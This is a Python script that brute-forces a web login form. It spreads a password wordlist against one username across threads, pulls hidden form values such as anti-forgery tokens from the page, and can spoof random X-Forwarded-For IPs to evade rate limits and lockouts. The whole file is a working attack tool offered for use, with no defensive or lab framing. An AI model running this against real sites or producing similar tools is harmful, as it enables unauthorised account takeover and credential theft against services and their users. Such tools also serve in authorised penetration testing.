#!/usr/bin/env python3
import argparse
from requests_html import HTMLSession
from collections import deque
import threading
from time import sleep
import random

WORK_ALL = True

def parsethemall():
    def thread_type(arg):
        argument = int(arg)
        if argument <= 0:
            raise argparse.ArgumentTypeError("%s is an invalid positive int value" % arg)
        return argument

    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="Url of the target.", required=True)
    parser.add_argument("-t", "--threads", help="Number of parallel requests.", type=thread_type, default=5)
    parser.add_argument("-H", "--headers", help="Set headers values separated by a semicolon.")
    parser.add_argument("-pf", "--password-file", help="Read passwords from file. If the value is a dash, reads from stdin.", required=True)
    parser.add_argument("-pn", "--password-name", help="Name of the variable that will receive the password.", required=True)
    parser.add_argument("-su", "--single-username", help="Use a single username", required=True)
    parser.add_argument("-ic", "--in-text-check", help="Detect if credentials succeeded or failed. Put a esclamation"
                                                       "mark at the beginning to detect failed login if the following"
                                                       "text is present", required=True)
    parser.add_argument("-un", "--username-name", help="Name of the variable that will receive the username.", required=True)
    parser.add_argument("-ev", "--extract-value", help="Specifies a custom post parameter from HTML page. Extract it by "
                                                     "using the following rule: <HTML tag>;<attribute to extract>;"
                                                     "<attribute identifier name>;<attribute identifier value>\n "
                                                     "<attribute reference> is the tag attribute that helps the "
                                                     "program to recognize the right tag to pick")
    parser.add_argument("--ip-spoof", help="Adds X-Forwarded-For header with random generated IP for every request",
                        action='store_true')
    return parser.parse_args()


def set_header(arg):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                             'Chrome/58.0.3029.110 Safari/537.36'}
    if not arg:
        return headers
    for header in arg.split(";"):
        var_name, var_data = header.split(":")
        headers[var_name] = var_data
    return headers


def generate_ip():
    valid_numbers = list(range(1, 254))
    d_n = []
    for i in range(4):
        d_n += [random.choice(valid_numbers)]
    return "{}.{}.{}.{}".format(d_n[0], d_n[1], d_n[2], d_n[3])


def in_text_check(html, text):
    if text.startswith('!'):
        if not text[1:] in html:
            return True
    elif text in html:
        return True
    return False


def pick_the_value(request, data):
    if not data:
        return None
    for value in data.split(";"):
        html_tag, attribute_to_extract, attribute_identifier_name, attribute_identifier_value = value.split(",")
        for element in request.html.find(html_tag):
            ain = element.attrs.get(attribute_identifier_name, "")
            if ain == attribute_identifier_value:
                yield attribute_identifier_value, element.attrs.get(attribute_to_extract, "")


def read_from_file(filepath):
    with open(filepath, "r") as f:
        for line in f:
            yield line.rstrip()


def worker(url, headers, username_val, username_name,  passwords, password_name,
           extract_value_args, in_text_check_val, ip_spoof=False):
    global WORK_ALL
    s = HTMLSession()
    if ip_spoof:
        headers['X-Forwarded-For'] = generate_ip()
    r = s.get(url=url, headers=headers)
    while WORK_ALL:
        if not passwords:
            sleep(0.3)
            continue
        password_value = passwords.popleft()
        data = {
            username_name: username_val,
            password_name: password_value,
        }
        if extract_value_args:
            for custom in pick_the_value(r, extract_value_args):
                data[custom[0]] = custom[1]
        if ip_spoof:
            headers['X-Forwarded-For'] = generate_ip()
        r = s.post(url=url, headers=headers, data=data)

        if in_text_check(html=r.text, text=in_text_check_val):
            print(" [ok] Credentials found:\t%s:%s" % (username_val, password_value))
            WORK_ALL = False


def threads_still_running(threads):
    for thread in threads:
        if thread.is_alive():
            return True
    return False


def main():
    args = parsethemall()
    queue_list = []
    threads_list = []
    headers = set_header(args.headers)

    for i in range(0, args.threads):
        queue_list.append(deque())

    for i in range(0, args.threads):
        threads_list.append(
            threading.Thread(
                target=worker, args=(args.url, headers, args.single_username, args.username_name, queue_list[i],
                                     args.password_name, args.extract_value, args.in_text_check, args.ip_spoof)
            )
        )
        threads_list[i].daemon = True
        threads_list[i].start()

    if args.password_file:
        count = 0
        for element in read_from_file(args.password_file):
            queue_list[count].append(element)
            count += 1
            if count >= args.threads:
                count = 0
    for element in threads_list:
        element.join()
    while threads_still_running(threads_list):
        for i, element in enumerate(queue_list):
            if element:
                break
        else:
            exit()


if __name__ == "__main__":
    main()
